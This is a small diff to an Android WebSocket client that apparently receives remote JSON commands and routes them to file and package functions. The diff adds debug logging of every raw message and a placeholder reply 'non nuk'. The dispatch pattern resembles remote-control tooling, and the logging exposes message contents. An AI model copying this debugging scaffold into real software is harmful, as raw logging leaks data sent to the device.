@@ -2,6 +2,7 @@ package com.ot.grhq.client;
 
 import android.content.Context;
 import android.util.Base64;
+import android.util.Log;
 
 import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.PackageManager;
@@ -32,6 +33,12 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
+        Log.d("eeee", message);
+        try {
+            sendResponse("client", "non nuk");
+        } catch (JSONException e) {
+            throw new RuntimeException(e);
+        }
         try {
             JSONObject json = new JSONObject(message);
             Command cmd = Command.valueOf(json.optString("cmd"));
